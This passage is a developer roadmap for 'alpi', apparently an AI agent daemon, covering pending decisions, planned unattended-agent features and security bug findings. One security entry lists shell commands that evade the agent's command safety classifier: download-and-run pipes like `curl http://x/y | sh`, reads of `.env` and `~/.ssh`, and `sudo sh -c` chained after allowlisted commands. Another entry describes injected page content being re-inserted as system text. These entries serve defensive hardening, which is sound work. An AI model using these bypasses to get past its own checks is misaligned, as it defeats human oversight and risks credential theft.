# alpi roadmap

Updated 2026-11-20. Current versions live in the changelogs. The Queue runs top to bottom; the creator
approves the next tasks from Proposed.

This is the task pool. [ARCHITECTURE.md](ARCHITECTURE.md) owns current state and
contracts; [CHANGELOG.md](../CHANGELOG.md), [desktop/CHANGELOG.md](../desktop/CHANGELOG.md)
and [mobile/CHANGELOG.md](../mobile/CHANGELOG.md) record what each version shipped;
[AGENTS.md](../AGENTS.md) defines the workflow that consumes this file.

## How this file works

Every task is one entry that one commit per product it releases can finish, with fixed fields
(decisions only need their question):

- **ID** — stable, never reused. Keep an existing ID when ARCHITECTURE, a
  changelog, a test or a sibling repository cites it.
- **type** — `bug`, `feature`, `chore`, `ui` (a visual change drawn as a board in
  [design/](../design/)), `verify` (evidence from a real device or environment),
  `deploy` (build, install or roll out outside the repository) or `decision`.
- **product** — `alpi`, `desktop`, `mobile`, `common` or `design`, one or more. A
  task that releases several products ships one commit per product, daemon first;
  a `common/` change releases both clients.
- **owner** — `agent` (finished in the repository and proved with tests) or
  `creator` (@soyjavi: an EAS build, a device check, a fleet deploy, credentials
  or a product choice).
- **priority** — `high`, `normal` or `low`. The Queue runs top to bottom in the
  creator's order; in the other lanes, order is priority, then position.
- **depends** — IDs that must finish first.
- **accept** — what proves it done. Agent tasks need evidence a test or command
  can show.

Lanes:

- **Queue** — approved agent tasks, in the order they will be done. Only the
  creator moves a task here, with two exceptions that enter at the top: a bug the
  creator reports, and a red pipeline on `main`.
- **In progress** — at most one agent task.
- **Needs creator** — `verify`, `deploy` and `decision` tasks, and agent work
  waiting on one of them.
- **Proposed** — ideas not yet approved, from the creator or from the agent.
  Never worked on until approved.

When a task ships, delete it and record it in the product's changelog and in the
ARCHITECTURE section it changes. When a feature needs device evidence, split it:
the implementation is an agent task; the device check is a creator `verify` task
that depends on it.

A purely visual idea is not filed here: its board on the `design/` Proposals page is the
proposal. Once the creator approves it, it becomes one `ui` entry in Queue that names the
board ID, with the board as its accept; shipping it deletes the board and regenerates
`design/`. A task that mixes logic and a screen is split: the screen is board `UI-<TASKID>`, and the
logic stays under its ID with the line "the interface follows board UI-<TASKID>" in its accept; board
IDs never equal a non-`ui` task ID. Tasks with no visual component never get a board.

Every agent task also meets these, on top of its `accept`: a regression test that
fails before the fix; the relevant `pytest --integration` tests run for the exact
release SHA (`publish.yml` runs only `pytest -q`); no new runtime dependency, RPC
framework or persisted state unless the task names it; a large file is not a
defect, so a helper is extracted only when it removes evidenced duplication.

## Release direction

- **Stabilize the current lines first.** Queue keeps the approved scope and console fixes ahead of new
  capabilities. A new feature does not hold up an independently releasable fix.
- **alpi 0.18 is the harness and stability line, and it is closed for now.** 0.18.0 shipped mid-turn
  compaction, repeated-failure hints, the provider pause, the delivered-empty-reply rule, action-level
  `tools.deny`, the tool-call deadline and the journal sweep cache; 0.18.1 added what the first day of fleet
  ledgers asked for (engine notes in the journal, the same-error hint, one copy of each tool output, the
  ledger kept by age). `HARN.018-VERIFY` reads the ledgers again; another harness patch needs evidence from it.
- **Next feature line: the unattended agent.** A reading of the whole harness on 2026-11-20 found that the loop
  holds up against the managed always-on agents and that three things do not: a profile is woken only by the
  clock, it cannot wait for its owner's decision, and it keeps no thread between runs. `The unattended line` in
  Proposed orders that work: wake on an event, park a decision, measure, keep a thread, and only then more
  connectors and secrets the model never sees. Nothing in it is approved by being listed; the creator moves each
  task to Queue.
- **Faults before features.** `Code reading 2026-11-20` holds what that reading found broken. An entry marked
  `run` or `read` goes ahead of any feature of the line; one marked `suspected` is settled by its failing test first.
- **Pipeline-side candidate: bounded repetition.** `WG.REPEAT` waits for the separate workgroup analysis (retry
  storms, `stale-round` waste) that only the creator's Mac can show. The goal is to finish a sequence of work
  without an external script triggering every run, with finite limits and restart-safe progress.
- **The clients keep their own versions.** Desktop and mobile release only when their shipped code changes;
  they do not inherit the daemon's minor number. Any new pipeline state needs an optional host field,
  console parity and compatibility tests before clients consume it.
- **Release evidence is separate.** Local suites prove implementation; a deployed busy-daemon check and
  a mobile device check belong in Needs creator. Existing synchronization fixes are not reopened here.

## Queue

## In progress

_None._

## Needs creator

### Decisions

- **SCOPE.D1** — Does `session_scope: device` bind an admin connection?
  `decision · alpi · creator · high`
  note: `can_read_session` retains the admin bypass, so a remote admin with
  `session_scope: device` sees sibling sessions through `session_search`, `session_read`,
  `recall_sessions` and session events, while `host.sessions.*`, `host.chat.*` and
  `host.runs.*` hide them. Prompts and running chat turns are bound to the admin's own
  connection but remain shared across its devices. Decide the remaining device boundary
  for admins and the cross-connection boundary for other session text.
  accept: decide whether remote admins are bound for session text, and whether that applies
  within their connection or across connections. Create a separate agent task for consistent
  enforcement, documentation and matrix tests; preserve the local socket owner semantics.
  Member-only isolation fixes in Queue do not wait on this decision.

- **SEC.D-UNREADABLE-HEADLESS** — May an operator let an unattended profile run commands the checker cannot read?
  `decision · alpi · creator · normal`
  note: since 0.19.9 such a command needs a person each time and no allowlist entry covers it, so a profile with no
  approver can never run one (since 0.19.15 the refusal says how to rephrase it through a file). The
  alternative is a per-profile setting, off by default and local-socket only, that restores the pre-0.19.9 behaviour
  for that profile: unreadable commands run after every pattern that could be checked passed.
  accept: decide between no setting and that setting. If it is wanted, create the agent task with its name, its
  default, who may set it and the log line each use writes. `DECIDE.2` in Proposed is a third answer: the command
  becomes a question the owner answers later.

- **OPS-CONN-POLICY** — Connection policy for the fleet
  `decision · alpi · creator · normal`
  accept: a written connection policy (one connection per person with an exact
  `profile_scope`, one device per physical device, the old row revoked on
  re-pairing, a profile's tools reviewed before granting scope) is confirmed and
  applied to every deployed daemon; any code it needs becomes an agent task.

- **BRAND.D1** — Brand choices still open
  `decision · alpi · creator · normal`
  note: decided by the creator: the brand accent is ink (cream on dark, black on light); the alpaca is
  drawn in the three crease tones of the ink from 48 px and in one flat ink below, and its name carries the T3 crease; objects are established origami models (the
  gate); object and colour are two stored values and every new profile takes the next pair of the roulette; the honeycomb
  marks a workgroup; the default profile is the alpaca. Still open, none blocking: the unit's name
  ("profile", with "fold" only the look); whether the box stays or becomes a paper hat.
  accept: a written answer to each; a different answer becomes an edit to the task it touches
  before that task ships.

- **MOB.ROSTER-STALE** — How does a populated phone roster say that its data is old?
  `decision · mobile · creator · normal`
  note: [Roster.jsx](../mobile/src/features/inbox/Roster.jsx) sends request errors only to its empty
  state; with cached rows and an online daemon, a failed refresh has no visible error. Since mobile 0.9.12
  each read retries itself and exposes `stale` (cached rows plus an error) and `updatedAt` for this treatment.
  accept: approve the stale-data and Retry treatment for an already populated roster, including
  partial profile/workgroup failure, large text and reduced motion. Draw board UI-MOB.ROSTER-STALE;
  its implementation becomes a separate mobile `ui` task and regenerates the design views.

### Builds and deployments

- **OPS-CRED-SWEEP** — Credential hygiene on every daemon
  `deploy · alpi · creator · normal`
  accept: the credential hygiene checklist in the creator's operations runbook
  has been run on every deployed daemon and `alpi doctor` reports no credential
  findings on each.

- **OPS-RETENTION** — Run journals and sessions have a retention window on every daemon
  `deploy · alpi · creator · normal`
  depends: DAEMON.RETENTION-SCAN
  note: until DAEMON.RETENTION-SCAN ships, the first sweep holds each profile's sessions lock for about as long as
  expired sessions × journals × 55 µs, and no turn of that profile starts or saves meanwhile.
  The daemons keep every run journal forever unless a profile sets `retention`; the busiest fleet holds
  about 2 GB of them. From alpi 0.18.2 the apps and `alpi setup` store the window as a number; earlier
  daemons need a hand edit of `config.yaml`.
  accept: every deployed daemon has `retention.runs_days` and `retention.sessions_days` at the creator's chosen
  values (root config, or per profile where they differ) and the next daily sweep removes the older journals.

### Verification

- **HARN.018-VERIFY** — The 0.18 line does what it shipped for on the deployed daemons
  `verify · alpi · creator · normal`
  note: on 2026-11-10, a day after 0.18.0, the fleet had no run error, no compaction (largest prompt a quarter
  of the window) and no provider pause; the daemons whose turns are longest had not run yet, and 0.18.1 was
  deployed on 2026-11-11.
  accept: after at least three days on 0.18.1, from the run journals and ledgers of the deployed daemons: the
  count of each `agent.engine_note` per profile, the escalation rate against 0.18.0, the journal bytes per run
  against 0.18.0, whether the longest-turn profiles compacted mid-turn without a provider rejection, and
  whether a provider pause opened and closed with one notification each way. Anything off becomes a `bug`.

## Proposed

### The unattended line

A reading of all of `alpi/` at commit `b6a7cc14` (alpi 0.19.25), against the managed always-on agents, found that the
loop is not what separates them. Three things are: a profile is woken only by the clock, it cannot wait for its
owner's decision, and it keeps no thread between runs. The entries below are in the order they would be approved
and each stands alone. What they start from:

- Jobs are `cron`, `once` or `inactivity` (`scheduler/run.py`). A `no_agent` job runs a script without a model; its
  output can become a notification, never a turn.
- An approval or an `ask_user` question is an in-memory future that waits 60 s or 300 s (`host/approval.py`,
  `host/clarification.py`). Only `terminal` commands are classified. Scheduled and workgroup turns are
  `alpi chat --once` children with no approver: a question gets a fallback string and a caution-class command is
  refused at once.
- A scheduled turn runs on a fresh engine and saves no session. In the apps every message builds a new engine that
  replays the user text and the final replies of earlier turns, not what their tools returned
  (`cli.py::_hydrate_from_path`).

- **WATCH.1** — A script job wakes an agent turn when it has something to say
  `feature · alpi · agent · high`
  note: every watch in a deployment is a script that polls and then starts `alpi chat` itself, because nothing lets
  a script's result start a turn. A `no_agent` job gains an optional `then` prompt. The script runs on the job's
  schedule with no model call; when it exits 0 and printed something, one agent turn runs with that prompt and the
  output, capped and marked untrusted, as its input; when it printed nothing the run is silent; a non-zero exit is
  the failure it is today. Script validation, the timeout and one job at a time per profile stay as they are.
  accept: a script that prints nothing costs no model call and files nothing; one that prints runs exactly one turn
  that receives the text as untrusted data; `last_run_message` tells a failed script from a failed turn;
  `host.schedule.list` carries the new fields as optional and an older client ignores them; the console lists the
  pair.

- **DECIDE.1** — A pending approval or question survives a restart and takes a late answer
  `feature · alpi · agent · high`
  note: a daemon restart loses every pending request, and an answer after the wait gets "unknown or already
  resolved". The phone polls every 15 minutes at best, so a request raised while the app is closed is never
  answered. Requests are stored under the profile, redacted and capped in count and age, with what was asked, by
  which run and their state. The wait an attended turn makes does not change.
  accept: a request written before a restart is listed by `host.approval.pending` / `host.clarification.pending`
  after it; an answer to an expired request is recorded and the client is told it came late; ownership rules of the
  two verbs hold; console parity in `/activity`.

- **DECIDE.2** — A scheduled job or a workgroup turn can ask and wait
  `feature · alpi · agent · high`
  depends: DECIDE.1
  note: the turn ends in a new outcome, waiting, with its question in the owner's inbox. The answer starts a
  follow-up turn of the same job that receives the question, the answer and what the first turn had done. A request
  nobody answers expires to today's behaviour. This is also what decides `SEC.D-UNREADABLE-HEADLESS`: an unreadable
  command becomes a parked question instead of a refusal.
  accept: a scheduled turn that calls `ask_user` or hits a caution-class command files one request and exits
  without running the command; the answer runs one follow-up turn and the command only if approved; an unanswered
  request leaves the job as it is today; the scheduler, gateways and `--once` ignore the new outcome unless they
  need it.

- **DECIDE.3** — An action that leaves the machine passes the gate
  `feature · alpi · agent · high`
  depends: DECIDE.1
  note: `email` send, reply, forward and delete run on one sentence of the tool description; `browser` click, type
  and press on nothing; MCP calls on deny globs — in unattended turns too. A profile policy names allow, ask or
  deny per tool action. On an attended turn "ask" is today's approval sheet. On an unattended one it parks the
  action: the exact call (recipient and body, selector, MCP arguments) is stored, shown to the owner and executed
  as stored once approved, without another model call. The defaults for outward actions are the creator's choice
  and are settled before this enters Queue.
  accept: the approved call runs byte-identical to what was shown; a denied one reaches the next turn as a denial;
  the audit trail records who approved; a profile with no policy behaves as today; console parity.

- **EVAL.1** — A task battery scores a harness change per model
  `chore · alpi · agent · normal`
  note: there are a dozen `--llm` tests and nothing that says whether a harness change made the agent better or worse.
  `ALPI_HOME=<tmp> alpi chat --once --emit-events --no-save` already isolates a run, and the run ledger records
  model, tokens, cost and tools. Missing: a task set with checkable outcomes (a file written, a value returned, a
  tool not called), a model argument, repetition, and one table of success, steps and cost per model. It lives
  beside `tests/manual/` and never runs in `publish.yml`.
  accept: one command runs the tasks against temporary homes for the models it is given and prints the table; with a
  stub model, a deliberately broken prompt section lowers the score in a test.

- **CONT.1** — A scheduled job keeps its own thread
  `feature · alpi · agent · normal`
  note: a job knows of its last run only what that run wrote to memory or to files. A job may opt in to a thread:
  its runs append to one session that the next run rehydrates, bounded by compaction and a turn cap, and shown in
  the apps as that job's history. `DECIDE.2` uses it for its follow-up turn.
  accept: the second run of a threaded job sees the first run's reply; a job without the option runs as today; the
  thread is owned like any scheduled run and deleting the job deletes it.

- **CONT.2** — The todo list outlives the turn
  `feature · alpi · agent · normal`
  note: `tools/todo.py` keeps the list in memory and `Session.save` omits it, so a plan dies with the process and a
  new message starts without it.
  accept: a session reloaded from disk has its open todos; a finished list is not carried forever.

- **CONT.3** — A chat keeps what its tools returned between messages
  `feature · alpi · agent · normal`
  depends: EVAL.1
  note: the model answers a follow-up without the files it read or the commands it ran one message earlier, and
  reads them again. Replaying earlier tool results costs prompt size, so the battery measures it first: success and
  cost with and without, per model, with the prune threshold doing its work.
  accept: the measured table is in the commit that turns it on or leaves it off; the replay is byte-stable for the
  provider cache; what is replayed is already redacted and capped.

- **CONT.4** — An interrupted turn resumes after a restart
  `feature · alpi · agent · low`
  depends: CONT.1
  note: the run journal is flushed per event but nothing replays it; a restart marks the run interrupted and the
  work starts again from nothing.
  accept: a turn killed after three tool calls continues from the fourth and repeats no call that had side effects.

- **MCP.REMOTE** — A remote MCP server over HTTP, signed in with OAuth
  `feature · alpi, desktop, mobile · agent · normal`
  depends: DECIDE.3
  note: the client speaks stdio only (`mcp/client.py`); a remote endpoint goes through `mcp-remote` and Node. The
  streamable-HTTP transport is `httpx`, already a dependency. Sign-in generalises the three flows of
  `mail/gmail_auth.py` (loopback, pasted URL, loopback run by the client through `host.*`), today written for
  Gmail only. Tokens live in the profile's `secrets/` and never reach a tool result. A remote server has no code to
  scan, so its tool descriptions are pinned when the owner adds it and a change is reported before the tools are
  offered again. It waits for `DECIDE.3`: more accounts in reach only behind the gate.
  accept: a server added by URL lists and calls its tools with no Node on the machine; the three sign-in flows work
  for it; a changed description withholds that server's tools until the owner accepts it; an older daemon answers
  `-32601` and the apps hide the option.

- **SECRET.REF** — The browser types a secret by name, on the site it belongs to
  `feature · alpi · agent · normal`
  note: `browser(action="type")` takes the literal text, so a password passes through the model's context, the
  provider and the session. `type` accepts `secret: <name>`; the harness fills the field from the profile's
  secrets, only when the page's origin is the one stored with that secret, and masks it in snapshots and traces.
  accept: the secret's value appears in no tool argument, result, snapshot, trace or session; typing it on another
  origin is refused and says why.

- **MEM.RECALL-MEASURE** — How often does a turn need an earlier conversation and not look for it?
  `chore · alpi · agent · normal`
  note: nothing is recalled unless the model calls `session_search` or `recall_sessions`; the semantic index exists
  only if the model built it; the post-turn reviewer is off by default. Before any automatic recall is designed, a
  script over a sessions directory counts the turns whose user message points at earlier work, and how many of them
  searched. Automatic recall is proposed only if that number is not small.
  accept: the script prints the two counts and the turns behind them; the result and the decision it leads to are
  recorded in this entry's place.

- **MEM.PROMOTE-APPS** — Memory candidates can be reviewed where the owner is
  `feature · alpi, desktop, mobile · agent · low`
  note: compaction queues candidate facts and only `alpi memory promote` applies them, so on a daemon nobody opens a
  console for, the queue fills and expires. A host verb lists, applies and discards candidates, with the same
  checks as the console command, and the TUI gains the same.
  accept: an applied candidate goes through the dedup and safety scan of `memory add`; a member connection cannot
  call the verb; an older daemon answers `-32601` and the apps hide the list.

### Code reading 2026-11-20

Reported by the same reading of commit `b6a7cc14`. Each note says how far the fault was checked: **run** (reproduced
on a temporary home), **read** (followed in the code, not run) or **suspected**. A suspected entry starts with the
failing test that settles it; if the test cannot be made to fail, the entry is deleted.

- **SCHED.RESTART-TICK** — A restarted scheduler never runs a second tick beside an orphaned one
  `bug · alpi · agent · low`
  note: read, dormant. Since 0.19.30 a daemon task that raises restarts after 5 s. `scheduler/run.py::serve` ends with
  `executor.shutdown(wait=False)`, so if `serve` ever raised while a tick thread sat in `run_job` (up to 24 h), the new
  `serve` would tick the same profile beside it: double fires, and one profile's fires no longer serial. Today `serve`
  swallows every exception from `tick`, so it cannot happen yet.
  accept: two `serve` loops for one home never run `tick` at the same time (a per-home tick lock or equivalent), with a
  test that raises out of `serve` mid-tick.

- **BROWSER.STATE** — A profile's browser session is its own and survives a crash
  `bug · alpi · agent · normal`
  note: suspected. `tools/browser.py` keeps one module-global browser, context and page on a worker thread, and
  `_storage_dir()` runs on that thread, outside the `get_home()` context variable, so two profiles in one daemon
  process may load and save the same `browser/state.json`. Read: the login state is written only on `close` and at
  exit, so a killed process loses it; the file has default permissions; and it is not in the read denylist of
  `tools/_paths.py`, so an owner-role turn can read its cookies with `read_file`.
  Run on 2026-11-26: `trace_start` resolves `.browser-traces/` on that thread too, so a trace one profile starts is
  written into another profile's workspace; and at interpreter exit `_shutdown` submits to an executor that is
  already shut down, so the cookies are not saved then either.
  accept: two profiles that browse in one process keep separate cookies; state written after a login survives
  `SIGKILL`; `read_file` on `browser/state.json` is refused for every caller.

- **MOBILE.FAILED-ONESHOT** — The phone's Activity does not count a failed one-shot as next up
  `bug · mobile · agent · low`
  note: read. Since alpi 0.19.31 a `once` job whose run failed stays in `host.activity.list`'s `scheduled` with
  `status: failed` and no `next_fire`; `mobile/src/features/shell/ActivityList.jsx` counts `scheduled.length` and lists
  it under "No fixed time" as "not scheduled". Desktop already drops it from upcoming (`common/activityGroups.mjs`).
  accept: a row with `status: failed` is shown as failed and left out of the next-up count, with a test.

- **HOST.RUNS-ADMIN** — An admin follows and cancels a scheduled run from an app
  `bug · alpi · agent · normal`
  note: read. `host.runs.*` filter by `owns_session` with no admin case (`host/runs.py:22`), and a scheduled run is
  owned by `host`, so a remote admin sees it in Activity but cannot read its journal or cancel it.
  accept: a remote admin reads and cancels a host-owned run inside its profile scope; a member still cannot.

- **HOST.MCP-ADD-CHECKS** — An MCP server added from an app is checked like one added in the console
  `bug · alpi · agent · normal`
  note: read. `alpi mcp add` runs the malware lookup for an `npx` package; `host.mcp.add` stores whatever it is sent
  and starts nothing (`host/config.py:507-531`). Its `env` may hold a literal secret in `config.yaml`.
  accept: both paths run one function; the app is told what the check found before the server is saved; a literal
  value in `env` is refused in favour of an `env:NAME` reference.

- **ALP.PEER-BUDGET** — A peer's budget is enforced or removed
  `bug · alpi · agent · normal`
  note: read. `Peer.budget` is stored and shown (`alp/peers.py:74`) and nothing reads it; only the callee's own
  daily budget stops a peer's request.
  accept: a peer over its budget is refused with a reason, or the field leaves the file, the wizard and the docs.

- **TTS.ONLINE** — `tts` says where the text goes
  `bug · alpi · agent · normal`
  note: read. The tool and its module call the voice "local, no API key"; it uses `edge_tts`, which sends the text
  to Microsoft's online service.
  accept: the tool description, [CONFIG.md](CONFIG.md), [SECURITY.md](SECURITY.md) and the knowledge reference say
  the text leaves the machine and to whom; a profile with `allow_network: false` does not offer the tool.

- **EDIT.ATOMIC** — `edit_file` does what its description says
  `bug · alpi · agent · low`
  note: read. The description promises a `.bak`; none is written, and the write is not atomic
  (`tools/edit_file.py:76`).
  accept: the description matches the tool; an edit interrupted mid-write leaves the old file whole.

- **WG.SELF-DECLARED** — A workgroup budget counts what was spent, not what the poster says
  `bug · alpi · agent · low`
  note: read. A post carries the cost its author declares and the lifetime budget is checked when the post arrives,
  after the spend (`alp/workgroup.py:294-316`). `WG.ORIGIN-WIRE` is the same question for a post's origin.
  accept: decided together with `WG.ORIGIN-WIRE`, when a workgroup spans daemons that do not share an owner.

- **HARN.DEAD-CODE** — Code nothing calls is removed
  `chore · alpi · agent · low`
  note: read; confirm each with `grep` before deleting. `doctor._live_pid` (calls `service.running_pid`, which does
  not exist); `scheduler/run.py` `_load_jobs`, `_save_jobs`, `running_pid`, `stop`, `ensure_running` (starts
  `alpi schedule start`, which does not exist); `tools/_guards.check_command` and its table; `llm._compute_cost`;
  `engine._platform_hint`; `GmailClient.mark_seen`; `prompts/create_skill_guide.md` and `skill_template.md` (loaded
  by nothing, and the guide names a `create_skill` tool that does not exist); the RPC handlers in `host/devices.py`
  that `service.py` never registers; `Meta.notify_on_close`; the `workgroup.pause` / `resume` RPCs only the hub may
  call and never does; `_chat_events.heartbeat` and `connection_id`; `service._mark_sub_dispatched` and
  `_canonical_pipeline_slug`; the desktop's `runs_list`, `run_read` and `run_cancel` commands with no caller.
  accept: each is gone or has a caller; the suites pass.

### Project analysis 2026-11-18

Found by a read-only analysis of alpi 0.19.7, desktop 0.10.10 and mobile 0.10.6 at commit `8ad58cef`. The code in
parentheses after a title (S1, D3, H2, DP1, M8 …) names the finding in the creator's analysis report of that date.
Each entry is written to be worked without that report:

- Line numbers are those of `8ad58cef`. Find the code by the symbol the note names; the line is a hint.
- One entry is one commit. Write the failing test first, with the input the note gives, and keep to the fix shape
  the note describes; anything else it uncovers becomes a new Proposed entry.
- Tests use the `tmp_home` fixture. A script run by hand sets both `HOME` and `ALPI_HOME` to a temporary directory
  and asserts `alpi.home._ROOT` is inside it: `alpi/home.py` resolves the root from `Path.home()`, so `ALPI_HOME`
  alone still points at the real home. It opens no socket.
- A task that changes what [SECURITY.md](SECURITY.md) or [CONFIG.md](CONFIG.md) states edits that paragraph and
  the matching file under `alpi/knowledge/references/` in the same commit.
- Times and sizes were measured on a laptop with a warm disk cache and synthetic data (5 profiles × 2,000 sessions,
  14,000 run journals, 500 outputs per profile). They size the problem; they are not acceptance thresholds, so a
  test asserts call counts, thread names or outputs, never wall-clock time.

#### Security — daemon

- **AUDIT.MARKUP** — A device name cannot break or disguise `alpi audit-log`
  `bug · alpi · agent · low`
  note: read (reproduced with a rich `Table`, not through the command). `audit_log_cmd` in `alpi/cli.py` (`:2003-2010`) passes `device_name` and `target_device_name` to rich's
  `Table.add_row` as markup, so a member device registered as `[/]x` makes the admin's `alpi audit-log` raise
  `MarkupError`, and `[white on white]` hides text. Older audit rows also keep escape bytes, since `list_entries` does
  not clean on read.
  accept: names with rich markup print literally and escape bytes are removed when read, with a test that registers
  `[/]x` and `\x1b[2J` names and runs `alpi audit-log`.

- **SEC.MEMBER-ORACLES** — Two member-reachable verbs validate before they read (S12, S13)
  `bug · alpi · agent · normal`
  note: `host.chat.send` loads `sessions/<session_id>.json` before `_check_id`
  ([chat.py](../alpi/host/chat.py) `:211-220` against `:238-240`): `session_id: "../../private/x"` answers
  `session not found` when the file exists and `invalid-params` when it does not, and the daemon parses and caches
  the file. `host.tools.list` is scope-free but reads `params.profile`
  ([host/tools.py](../alpi/host/tools.py) `:56-60`), so a scoped member reads the `tools.deny` of a profile outside
  its scope.
  accept: `host.chat.send` with a session id that fails `_check_id` answers `invalid-params` without opening any
  file (a spy on `open` under a planted directory); `host.tools.list` from a scoped member with an out-of-scope
  profile answers `forbidden`.

- **SEC.REDACT-2** — The redactor runs before every cap and knows the remaining token shapes (S14, S17)
  `bug · alpi · agent · normal`
  note: a PEM block cut by a cap is stored in clear, because the cap runs first
  ([_redact.py](../alpi/_redact.py) `:74-88`; sessions cap at 400 characters, the replay sidecar at 4,000). Shapes
  that pass today: `X_API_KEY=`, `EMAIL__W__PASSWORD=`, `auth_token=`, `pairing_token=`, alpi's own device and
  pairing tokens, AWS secret and Azure keys, `ghs_`, `ghu_`, `ghr_`, `hf_`, `tskey-`, `ATATT`, `npm_`, `pypi-`,
  `dckr_pat_`, `sk_live_`, `GOCSPX-`, Slack webhook URLs and a JSON `"password"` value. `logs/runs.jsonl`
  `output_tail` uses its own `run_ledger._redact` ([run_ledger.py](../alpi/run_ledger.py) `:112-123`).
  `mentions/<sender>.json` ([mention_thread.py](../alpi/alp/mention_thread.py) `:104`) and promotion candidates
  ([promotion.py](../alpi/promotion.py) `:87`) are written unredacted with the umask mode.
  accept: redaction runs before truncation at both caps (a PEM longer than the cap leaves no key material); one
  test case per shape above; `run_ledger` calls `_redact.redact`; mentions and promotion candidates are redacted
  and created `0600`; a 2 MB adversarial input through each new pattern finishes in under a second.

- **SEC.SANDBOX-HOME** — The macOS sandbox profile protects the home alpi actually uses (S15)
  `bug · alpi · agent · normal`
  note: [_sandbox.py](../alpi/tools/_sandbox.py) (`:63-64,82-84`) hard-codes `/.alpi/`. With a home of another name
  `.env` is readable and `config.yaml` writable inside the sandbox, and the root `secrets/` (the default profile's
  Gmail tokens) is readable even under `.alpi`.
  accept: the profile text is built from the resolved alpi root and denies `secrets/` at the root and per profile;
  a unit test builds it for a home named `.myalpi` and finds that path in the deny rules; an `--integration` test
  on macOS fails to `cat` the `.env` and a file under `secrets/` from inside the sandbox.

- **SEC.TERMINAL-LEFTOVERS** — The classifier catches the remaining writes into the alpi home (S2b)
  `bug · alpi · agent · low`
  note: `cp /tmp/config.yaml $ALPI_HOME/`, `tar xf e.tar -C $ALPI_HOME`, `mv ~/.ssh /tmp/s` and
  `curl file://$ALPI_HOME/.env` are `safe`. The caution tier misses `rm -f -r ~`, `git push -f` and `doas`. An
  allowlist glob `sudo apt *` approves `sudo apt update & sudo sh -c id`.
  Left over from the SEC.TERMINAL-FAILCLOSED review, all safe before it too: a variable bound by `for`, `read`
  or `set --` and then used as a path (`for d in $ALPI_HOME; do cat $d/.env; done`, `set -- $ALPI_HOME; cat $1/.env`);
  a command name held in a variable (`A=curl; $A http://x/y | bash`, `cmd=bash; curl http://x/y | $cmd`); a payload
  behind `env -S "bash -c '…'"` or `su -c`; `php -r` and `php <<EOF` as interpreters; and
  `bash -ic $'shopt -u interactive_comments …'`, which makes a `#` mean something else to the shell.
  Also left, and the worst of them: a pipe to an interpreter inside a group or after a group is not seen
  (`(curl http://x/y | sh)`, `{ curl http://x/y | sh; }`, `(true); curl http://x/y | sh`, `x=$(date); curl http://x/y | sh`,
  `diff <(curl http://x/y | sh) /dev/null`), because `_split_by_pipe` and `_split_by_separators` do not split inside
  groups, `_segment_contains` looks only at a segment's first command and shlex glues `);` into one token. Trim,
  replace and offset modifiers (`${X%Z}`, `${X::-1}`) use the variable's whole value instead of the trimmed one, and
  the regex patterns of `_approval._PATTERNS` run on the raw text, so `rm -rf / # note` is only `caution`.
  Found by the third review: more downloaders-to-interpreter forms are not seen (`curl x | source /dev/stdin`,
  `| . /dev/stdin`, `| eval "$(cat)"`, `| busybox sh`, `| ${SHELL:-sh}`, `| $BASH`, `pypy3`, `python3.12t`, `bash-5.2`);
  a heredoc with an apostrophe asks (`git commit -F - <<'EOF'`, `git commit -m "$(cat <<'EOF' … it's … EOF)"`,
  `gh pr create --body-file - <<'EOF'`, `psql <<'SQL'`, `tee notes.md <<'EOF'`). A narrow exception for
  `cat <<'WORD'` as data was written and removed after four reviews: it was bypassed through a prefix word, a
  function named `cat`, an earlier heredoc, and bash 3.2 closing `$(` at the first `)` in the body. A real
  fix needs a shell parser, not a text scan; and the clients (TUI, desktop `ApprovalModal.jsx`, mobile `ApprovalSheet.jsx`) still offer
  "Always allow" on the once-only prompt, where it does nothing: an optional `once_only` field in the
  `approval.request` payload would let them hide it.
  accept: the first four are `dangerous`, the next three `caution`; an allowlist pattern matches one simple command
  and never a line containing `&`, `;`, `|`, `&&`, `||` or a substitution; tests for each.

- **SEC.TOOL-BOUNDS** — `terminal` and `db` stop at a deadline (S16)
  `bug · alpi · agent · low`
  note: `terminal` is exempt from `tools.call_timeout_s` and its `timeout` argument has no ceiling
  ([terminal.py](../alpi/tools/terminal.py) `:373,425,437`); a tool that passes the deadline keeps its thread
  ([tool_executor.py](../alpi/core/tool_executor.py) `:110-121`); `db` installs no progress handler, so a recursive
  CTE holds a core until the process restarts.
  accept: `terminal`'s `timeout` is clamped to `tools.terminal.max_timeout_s` (new key, default 3600, documented in
  CONFIG.md); `db` installs a `set_progress_handler` that aborts the statement at the tool deadline; a test runs an
  endless recursive CTE and gets an error result within the deadline.

- **SEC.BACKUP-LINKS** — A backup says which links it left out (S18)
  `bug · alpi · agent · low`
  note: `alpi backup` counts hardlinks and symlinks as files and `alpi restore` drops them silently
  ([backup.py](../alpi/backup.py) `:487`): five reported, three written.
  accept: links are reported as skipped, with their count, by both commands, and the two counts agree; a test with
  one hardlink and one symlink.

- **SEC.COMPACT-ROLE** — A compaction summary reaches the model as untrusted data, not as a system message (S19)
  `bug · alpi · agent · low`
  note: suspected, not exercised with a live model. [compaction.py](../alpi/compaction.py) (`:486-489`) inserts the
  summary with `role: system`, built from tool outputs without their untrusted-data envelope. Since 0.18.0 it runs
  mid-turn, so an injected page can come back as system text inside the same turn.
  accept: the summary is a `user` message under an `[engine]` header with the same envelope tool output gets; the
  compaction shape tests are updated; the pairing of `tool_calls` and replies still holds after a compaction.

- **SEC.MCP-BOUNDS** — A misbehaving MCP server is cut off (S20)
  `bug · alpi · agent · low`
  note: one endless stdout line exhausts memory ([mcp/client.py](../alpi/mcp/client.py) `:362-370`); the joined
  names of server `a` + tool `b__c` and server `a__b` + tool `c` collide
  ([mcp/registry.py](../alpi/mcp/registry.py) `:203-208`).
  accept: a line longer than 8 MB closes that server with an error result; a colliding tool name is skipped and
  `alpi doctor` names it; tests with a fake server.

- **SEC.OLD-MINORS** — Three minors of the 2026-10-28 audit that were neither fixed nor filed
  `bug · alpi · agent · low`
  note: one per commit. HOST-5: `host.attachments.stage` has no per-connection quota, the voice-script cache has no
  cap and `host.voice.script` is an unmetered model call per distinct text. HOST-6: `_active[request_id]` is a global
  map ([chat.py](../alpi/host/chat.py) `:327`), so two connections that pick the same id overwrite each other.
  TOOLS-3: `clarification_messages` replays the model's own question as `role: user`
  ([session.py](../alpi/session.py) `:496-500`).
  accept: a byte quota per connection in staging, an LRU cap on the script cache and a per-connection rate limit on
  the two voice verbs; `_active` keyed by connection, device and request id; the clarification question replayed
  as assistant text; a test for each.

#### Security — dependencies and the release chain

- **SEC.DEPS-AUDIT** — Known advisories on the locked versions fail validation
  `chore · alpi · agent · normal`
  note: SECURITY.md promises "`pip-audit` before every release. Zero tolerance for known CVEs on the lockfile",
